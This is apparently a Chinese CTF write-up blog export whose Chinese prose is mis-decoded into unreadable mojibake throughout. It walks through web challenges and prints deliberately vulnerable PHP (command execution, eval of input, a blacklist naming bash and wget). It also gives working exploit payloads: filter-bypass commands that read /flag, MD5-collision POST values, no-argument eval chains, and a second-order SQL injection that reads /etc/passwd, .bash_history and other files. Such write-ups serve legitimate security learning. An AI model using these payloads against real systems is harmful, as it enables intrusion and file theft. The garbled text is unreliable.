class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixiï½ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿåˆ°å¯ä»¥æ‰§è¡Œçš„ç‚¹æ˜¯å‚æ•° <code>cmd</code>ï¼Œä½†æ˜¯æ­£åˆ™è¿‡æ»¤ååˆ†è‹›åˆ»ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªç‚¹ï¼Œå¯¹äº php æ¥è¯´ï¼Œæ­£åˆ™éœ€è¦ä½¿ç”¨ <code>\\\</code> æ¥åŒ¹é…æ‰èƒ½åŒ¹é…åˆ°åæ–œæ ï¼Œæ‰€ä»¥å®é™…ä¸Šåæ–œæ è¿˜èƒ½ç”¨ã€‚åœ¨ä¸€ç•ªæŸ¥æ‰¾ä¸‹ï¼Œæˆ‘æ‰¾åˆ°äº†å¦å¤–ä¸€ä¸ªå¯ä»¥ç”¨çš„æŒ‡ä»¤ <code>sort</code>ã€‚äºæ˜¯è¿™éƒ¨åˆ†å°±æœ‰äº†ä¸¤ç§è§£å†³æ–¹æ³•ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ca\t /fla\g</span><br><span class="line">sort /flag</span><br></pre></td></tr></table></figure><p>å‰©ä¸‹çš„å°±æ˜¯ MD5 ç¢°æ’çš„é—®é¢˜ã€‚ä¸€ç•ªæŸ¥æ‰¾ä¹‹ä¸‹ï¼Œæˆ‘æ‰¾åˆ°äº†ä¸€ä¸ªç”Ÿæˆ MD5 ç¢°æ’å­—ç¬¦ä¸²çš„å·¥å…·ã€‚ç”Ÿæˆå¥½ä¹‹åæŠŠå­—ç¬¦ä¸²åˆ†åˆ« urlencode ä¹‹åç»„åˆæˆ POST å‚æ•°ï¼Œä½¿ç”¨ Burpsuite å‘é€è¯·æ±‚ï¼ˆHackBar ä¾æ—§æ²¡æœ‰æˆåŠŸï¼‰ã€‚æœ‰ä¸€ä¸ªæ¯”è¾ƒç¥å¥‡çš„ç‚¹æ˜¯ï¼Œæˆ‘åœ¨æŠŠ POST è¯·æ±‚æœ€åçš„æ¢è¡Œç¬¦å»æ‰ä¹‹åæ‰è¯·æ±‚æˆåŠŸçš„ã€‚æœ‰å¯èƒ½æ˜¯è¿™ä¸ªåŸå› å¯¼è‡´ä½¿ç”¨ HackBar æ— æ³•æˆåŠŸå¾—åˆ° flagã€‚</p><p>è¿™é‡Œè´´ä¸Šæˆ‘ä½¿ç”¨çš„ä¸¤ä¸ªå‚æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%D1B%A9%11U%DD%AF%15vu%0F%DA%F6%7Dd%8B%DE%0A%AD%91r%DE%8De%07%9AC%AE%2A%BAF%DBw%BD%BB%E3%DE%E0%AD4gZ_%5C%13%1E%19F%28%7B%A8%D1%7F%2C%17%9BO%12%B4%8A%2B%DA%B9%E1%0F%0F%EBAT%07%213kujM%9DS%97%02%B3M%5DHd%DC%91%C1%AB%C3+%E8%B7_%A8%C7%D3%FDz%E8%9F%021%1E4%01%C83%12%0C%1B%8C%F6%CA%CA%CA%93K%40%5D%94%C8%AE%D0%A6%09Q%2B&amp;b&#x3D;1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%D1B%A9%11U%DD%AF%15vu%0F%DA%F6%7Dd%8B%DE%0A%AD%11r%DE%8De%07%9AC%AE%2A%BAF%DBw%BD%BB%E3%DE%E0%AD4gZ_%5C%13%9E%19F%28%7B%A8%D1%7F%2C%17%9BO%12%B4%0A%2B%DA%B9%E1%0F%0F%EBAT%07%213kujM%9DS%97%02%B3M%5D%C8d%DC%91%C1%AB%C3+%E8%B7_%A8%C7%D3%FDz%E8%9F%021%1E4%01%C83%12%8C%1A%8C%F6%CA%CA%CA%93K%40%5D%94%C8%AEP%A6%09Q%2B</span><br></pre></td></tr></table></figure><p>å‡†ç¡®æ— è¯¯åœ°å‘é€å°åŒ…ä¹‹åå¯ä»¥å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f9dccbe4-f6d1-4928-9904-fc1e1d39944d&#125;</span><br></pre></td></tr></table></figure><h3 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Regexp</span><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">RCE</span><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Session</span><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Source Leak</span></p><p>é¢˜ç›®å¼€å§‹å°±åªæœ‰ä¸€å¥è¯ï¼ŒHeader å’Œ Cookie ä¹Ÿæ²¡å¾—çº¿ç´¢ï¼Œäºæ˜¯æœæ–­æ‰«ç›®å½•ï¼Œå‘ç° <code>/.git</code> å“åº”é•¿åº¦ä¸ä¸€æ ·ã€‚äºæ˜¯æœæ–­ä¸Š GitHack æ‹¿åˆ°äº†é¦–é¡µæºç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å•Šï¼Œçœ‹è¿™æ­£åˆ™è¿‡æ»¤ï¼Œå¤šä¹ˆç¾å¦™ï¼ŒçœŸå®çš„ä¸€ä¸ªå‚æ•°éƒ½ä¸ç»™ä½ ã€‚ä¸è¿‡ä¸æ…Œï¼Œæˆ‘å¯æ˜¯æœè¿‡åŠå°æ—¶ç›¸å…³çŸ¥è¯†ç‚¹çš„èŒæ–°ã€‚å…ˆæ„é€ ä¸ª <code>scandir(current(localeconv()))</code> çœ‹ä¸€ä¸‹æ ¹ç›®å½•æœ‰å•¥ã€‚è¿™é‡Œçš„åŸç†å°±æ˜¯ <code>localeconv()</code> è¾“å‡ºçš„æ•°ç»„ä¸­ç¬¬ä¸€ä¸ªä¸€å®šæ˜¯ä¸€ä¸ª <code>.</code>ã€‚æ ¹æ®ç»“æœå‘ç° flag.php åœ¨æ ¹ç›®å½•ã€‚äºæ˜¯å°±å¾—æƒ³åŠæ³•è¯»å–å®ƒå•¦ï¼Œä½†æ˜¯å®ƒä¸åœ¨æ•°ç»„çš„ç¬¬ä¸€ä¸ªï¼Œæœ‰ä¸¤ç§åŠæ³•æ¥è¯»åˆ°å®ƒã€‚æŠŠæ•°ç»„åè¿‡æ¥ç„¶åæ•´ä¸ª <code>next()</code>ï¼Œä¹Ÿå°±æ˜¯  <code>highlight_file(next(array_reverse(scandir(pos(localeconv())))))</code>ã€‚æˆ–è€…ç®€å•ç²—æš´ï¼Œæ•´ä¸ª flip å’Œ rand <code>readfile(array_rand(array_flip(scandir(current(localeconv())))))</code> ä¸åœåœ°åˆ·æ–°ï¼Œå°±èƒ½åˆ·åˆ°å•¦ã€‚</p><p>æˆ‘è¿˜æŸ¥åˆ°äº†ä¸€ç§ç¥å¥‡çš„åšæ³•ï¼Œåˆ©ç”¨ session æ¥å®Œæˆã€‚é¦–å…ˆåœ¨ Console é‡Œé¢æ‰§è¡Œ <code>document.cookie=&quot;PHPSESSID=flag.php&quot;</code> æŒ‡å®š SessionIdã€‚ç„¶å exp å†™ <code>show_source(session_id(session_start()));</code> å°±èƒ½æˆåŠŸè¯»åˆ° flag.php ä»è€Œæ‹¿åˆ° flag äº†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5f914f8d-550d-4c3a-bdae-345f50997b0d&#125;</span><br></pre></td></tr></table></figure><h3 id="ç½‘é¼æ¯-2018-Comment"><a href="#ç½‘é¼æ¯-2018-Comment" class="headerlink" title="[ç½‘é¼æ¯ 2018]Comment"></a>[ç½‘é¼æ¯ 2018]Comment</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Source Leak</span><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SQL Injection</span><span style="padding: 0.25rem 0.375rem;background-color: #b8391a;color: #fff;font-size: 0.75rem;margin-right: 5px;">githacker</span></p><p>è¿™é¢˜æ˜¯äº‹å…ˆå°±è¢«é€éœ²äº†æ˜¯ git æºç æ³„éœ²çš„ï¼Œå…¶å®è¿˜æœ‰ä¸ªè¦ç‚¹ï¼ŒConsole é‡Œè¯´æ²¡æœ‰ commitï¼Œè¿™ç‚¹å¾ˆé‡è¦ã€‚è°ƒæ•´ git çš„ HEAD æ‰èƒ½æ‹¿åˆ°å®Œæ•´çš„æºç ï¼Œä½¿ç”¨åˆ°çš„å·¥å…·æ˜¯ <a href="https://github.com/wangyihang/githacker">githacker</a>ã€‚æ¢å¤æºç ä¹‹åå¯ä»¥æ‹¿åˆ° write_do.phpã€‚ä»”ç»†è¯»ä¸€è¯»ï¼Œä¸éš¾å‘ç°ï¼Œä¿®æ”¹çš„æ—¶å€™ <code> $category = mysql_fetch_array($result)[&#39;category&#39;];</code>ï¼Œè¿™é‡Œçš„å˜é‡ <code>$category</code> ä¼šè¢«ç›´æ¥ä¼ å…¥ SQL è¯­å¥ä¸­ã€‚æ‰€ä»¥åªè¦æƒ³åŠæ³•ä½¿ <code>content</code> å˜æˆæˆ‘ä»¬æƒ³è¦çš„æ•°æ®å°±è¡Œäº†ã€‚æ‰€ä»¥ï¼Œå¯ä»¥ä½¿ <code>category</code> ä¸º <code>&#39;,content=payload/*</code> ç„¶åæäº¤ä¹‹åå†ä¿®æ”¹ <code>content</code> ä½¿å…¶ä¸º <code>*/#</code> é—­åˆä¸€ä¸ªæ³¨é‡Šç„¶åæŠŠåé¢çš„è¯­å¥éƒ½æ³¨é‡Šæ‰ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œè¯­å¥å˜åŒ–äº†ï¼Œè¿™æ ·å°±èƒ½ä½¿ <code>content</code> è¾“å‡ºæˆ‘ä»¬éœ€è¦çš„å†…å®¹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;&#x27;,content=payload/*&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;*/#&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="string">&quot;insert into comment set category = &#x27;&#x27;,content=payload/**/#&quot;</span></span><br></pre></td></tr></table></figure><p>ä¸€å¼€å§‹æˆ‘æ˜¯æƒ³ç›´æ¥æ‰¾åˆ°ç”¨æˆ·å¯†ç çš„ï¼Œå°è¯•è¯»å– <code>/etc/passwd</code> å’Œ <code>/etc/shadow</code> æœªæœä¹‹åï¼Œæˆ‘åˆé•¿äº†æ–°çŸ¥è¯†ã€‚æ ¹æ® <code>/etc/passwd</code> ä¸‹çš„æç¤º ï¼Œwww ç”¨æˆ·å¯ä»¥ä½¿ç”¨ bashï¼Œäºæ˜¯æŸ¥è¯¢è¯¥ç”¨æˆ·çš„ <code>.bash_history</code> æ‰¾åˆ°äº†çº¿ç´¢ï¼Œè¯»å– <code>/tmp/html/.DS_Store</code>ã€‚è¿™é‡Œè¿˜æœ‰ä¸ªè¦ç‚¹ï¼Œå› ä¸ºæ–‡ä»¶å¤ªé•¿äº†ï¼Œä½¿ç”¨ <code>load_file()</code> è¯»å–çš„æ—¶å€™å¯èƒ½æ˜¾ç¤ºä¸å®Œæ•´ï¼Œæ‰€ä»¥å°±ç”¨ <code>hex()</code> è½¬æ¢ä¸€ä¸‹ï¼Œæ„é€  <code>&#39;,content=(select hex(load_file(&#39;/tmp/html/.DS_Store&#39;))),/*</code>ï¼Œè§£ç ä¹‹åæ‰¾åˆ°äº†çº¿ç´¢ <code>flag_ 8946e1ff1ee3e40f.php</code>ã€‚æŒ‰ç…§ä¸€æ ·çš„å¥—è·¯è¯»å–è¿™ä¸ªæ–‡ä»¶å¯ä»¥è¯»å–åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;bcd19c68-e4eb-43d7-845a-7a51bce22828&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æ—¥å¸¸èµ›äº‹è§£é¢˜è®°</title>
      <link href="/zh-CN/posts/24a48841.html"/>
      <url>/zh-CN/posts/24a48841.html</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘é›¶é›¶æ•£æ•£åœ¨å„ç§ä»å„ç§æ¸ é“å‚åŠ çš„èµ›äº‹ä¸Šå†™äº†äº›æ°´é¢˜ï¼Œä¸€ç›´åœ¨çº ç»“åˆ°åº•è¦ä¸è¦è®°ã€‚ä¸è¿‡æ—¢ç„¶éƒ½åšäº†ï¼Œæ„Ÿè§‰è¿‡ç¨‹ä¸­ä¹Ÿæœ‰ä¸å°‘éªšæ“ä½œï¼Œå°±ç¨å¾®è®°ä¸€è®°ã€‚æ­£å¥½ä¹Ÿè®°ä¸Šè¿™äº›æ¯”èµ›é‡Œæ²¡å†™å‡ºæ¥çš„é¢˜ç›®çš„å¤ç°ã€‚</p><p><escape><span id="more"></span></escape></p><hr><div style="pointer-events: none"><h2 style="display:none" id="Dawg-CTF-2020">Dawg CTF 2020</h2><img src="https://ae01.alicdn.com/kf/H24a98f5da04f45e2887a01b5e0d640eff.png"/></div><h3 id="Free-WIFI-Part-1"><a href="#Free-WIFI-Part-1" class="headerlink" title="Free WIFI Part 1"></a>Free WIFI Part 1</h3><p>é™„ä»¶ç»™äº†ä¸ª free-wifi.pcapngï¼Œå¯¼å…¥åˆ° WireShark é‡Œç•¥å¾®åˆ†æï¼Œå¯ä»¥å‘ç°ä¸€ä¸ªè¯·æ±‚ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    [Full request URI: http:&#x2F;&#x2F;freewifi.ctf.umbccd.io&#x2F;staff.html]</span><br><span class="line">    [HTTP request 1&#x2F;1]</span><br><span class="line">    [Response in frame: 89]</span><br><span class="line">    File Data: 134 bytes</span><br><span class="line">HTML Form URL Encoded: application&#x2F;x-www-form-urlencoded</span><br><span class="line">    Form item: &quot;csrf_token&quot; &#x3D; &quot;ImE4OGVkMWY1ZDg4YWU4MmQxMzFmODg4ZmVhMWY2MDQ0ZjUxMDA4MjAi.Xo4DYg.fnXZhEmbQPzEgFWLgEfjSTeqX2Y&quot;</span><br><span class="line">    Form item: &quot;passcode&quot; &#x3D; &quot;5004f47a&quot;</span><br><span class="line">    Form item: &quot;submit&quot; &#x3D; &quot;Submit&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å°è¯•è®¿é—® staff.htmlï¼Œå¹¶æ ¹æ®ä¸Šè¿°è¯·æ±‚æ„é€ ä¸€ä¸ª POST è¯·æ±‚ï¼Œå°±èƒ½åœ¨é¡µé¢åº•ç«¯æ‹¿åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DawgCTF&#123;w31c0m3_tO_d@wgs3c_!nt3rn@t!0n@1&#125;</span><br></pre></td></tr></table></figure><h3 id="The-Lady-is-a-Smuggler"><a href="#The-Lady-is-a-Smuggler" class="headerlink" title="The Lady is a Smuggler"></a>The Lady is a Smuggler</h3><p>è¿™é¢˜ä¸€å¼€å§‹ç»™äº†ä¸ªé¡µé¢ï¼Œä¸‹é¢æœ‰ä¸€æ®µåŠ å¯†ï¼Œä½†å…¶å®è§£å¯†é‚£æ®µå¾—å‡ºæ¥çš„ flag æ˜¯æ— æ•ˆçš„ã€‚çœŸå®çš„ flag åœ¨é¡µé¢çš„æºç ä¸­ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DawgCTF&#123;ClearEdge_ElizebethSmith&#125;</span><br></pre></td></tr></table></figure><h3 id="Tracking"><a href="#Tracking" class="headerlink" title="Tracking"></a>Tracking</h3><p>è¿™é¢˜é¡µé¢æ„Ÿè§‰è·Ÿå‰é¢é‚£ä¸ªä¸€æ ·ï¼Œé¦–å…ˆçœ‹ä¸€æ‰‹æºç ã€‚æ‰¾åˆ°ä¸€æ®µ JavaScriptã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="built_in">String</span>.fromCharCode(<span class="number">68</span>,<span class="number">97</span>,<span class="number">119</span>,<span class="number">103</span>,<span class="number">67</span>,<span class="number">84</span>,<span class="number">70</span>,<span class="number">123</span>,<span class="number">67</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">114</span>, <span class="number">69</span>,<span class="number">100</span>,<span class="number">103</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">105</span>,<span class="number">125</span>))</span><br></pre></td></tr></table></figure><p>æ”¾åˆ° Console é‡Œé¢è¿è¡Œå°±å¾—åˆ°äº† flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DawgCTF&#123;ClearEdge_uni&#125;</span><br></pre></td></tr></table></figure><hr><div style="pointer-events: none"><h2 style="display:none" id="Deep-CTF">Deep CTF</h2><img src="https://ae01.alicdn.com/kf/H9f57bc3eb2ec46d9af14db462b6d4a94p.png"/></div><h3 id="Oh-JS"><a href="#Oh-JS" class="headerlink" title="Oh JS!"></a>Oh JS!</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #b8391a;color: #fff;font-size: 0.75rem;margin-right: 5px;">JSFuck</span></p><p>è¿™é¢˜å¼€é—¨è§å±±åœ°ç»™äº†ä¸ªç™»å½•çš„ formï¼Œä½†å…¶å®æŸ¥çœ‹é¡µé¢æºä»£ç å¯ä»¥çœ‹åˆ°ä¸€æ®µ JSFuckï¼ŒæŠŠå®ƒæå¤´å»å°¾æ”¾åˆ° Console è·‘ä¸€ä¸‹å¯ä»¥å‘ç°çº¿ç´¢ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Æ’ anonymous(</span><br><span class="line">) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.forms[<span class="number">0</span>].username.value == <span class="string">&quot;corb3nik&quot;</span> &amp;&amp; <span class="built_in">document</span>.forms[<span class="number">0</span>].password.value == <span class="string">&quot;chickenachos&quot;</span>) <span class="built_in">document</span>.location = <span class="string">&quot;4d4932602a75414640946d38ea6fefbf.php&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>äºæ˜¯ç›´æ¥è·³è¿‡ç™»å½•çš„æ­¥éª¤ï¼Œè®¿é—® <code>.../4d4932602a75414640946d38ea6fefbf.php</code> å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d33p&#123;g0tta_kn0w_y0ur_J4v4Scr1pt&#125;</span><br></pre></td></tr></table></figure><h3 id="Magic-Word"><a href="#Magic-Word" class="headerlink" title="Magic Word!"></a>Magic Word!</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Regexp</span></p><p>è¿™é¢˜ç»™å‡ºäº†é¡µé¢çš„æºä»£ç å’Œ <code>Try to reach get_mad_and_give_flag()</code> çš„æç¤ºã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">require</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;magic_word&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$what_he_said</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;magic_word&#x27;</span>];</span><br><span class="line">    <span class="variable">$what_you_dont_want_to_hear</span> = <span class="string">&#x27;d33p&#x27;</span>;</span><br><span class="line">    <span class="variable">$what_you_actually_heard</span> = preg_replace(</span><br><span class="line">            <span class="string">&quot;/<span class="subst">$what_you_dont_want_to_hear</span>/&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$what_he_said</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$what_you_actually_heard</span> === <span class="variable">$what_you_dont_want_to_hear</span>) &#123;</span><br><span class="line">      get_mad_and_give_flag();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ—¢ç„¶æ˜¯ <code>preg_replace()</code>ï¼Œä¹‹å‰åœ¨ SQL æ³¨å…¥çš„é¢˜ç›®é‡Œé¢é‡åˆ°è¿‡ï¼Œåªéœ€è¦å¤¹ç€å†™ä¸€éå°±è¡Œäº†ã€‚äºæ˜¯æ„é€  <code>?magic_word=d3d33p3p</code> å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d33p&#123;d33p_p33d&#125;</span><br></pre></td></tr></table></figure><h3 id="Nothing-is-Impossible"><a href="#Nothing-is-Impossible" class="headerlink" title="Nothing is Impossible"></a>Nothing is Impossible</h3><p>è¿™é¢˜ç»™çš„æ˜¯ä¸€ä¸ªå¯ä»¥æ‰§è¡Œ php ä»£ç çš„æ¡†ï¼Œäºæ˜¯æœæ–­è¯•äº†ä¸€æ‰‹ <code>system()</code>ï¼Œå‘ç°ä»ç„¶å¯ä»¥ä½¿ç”¨ã€‚æ 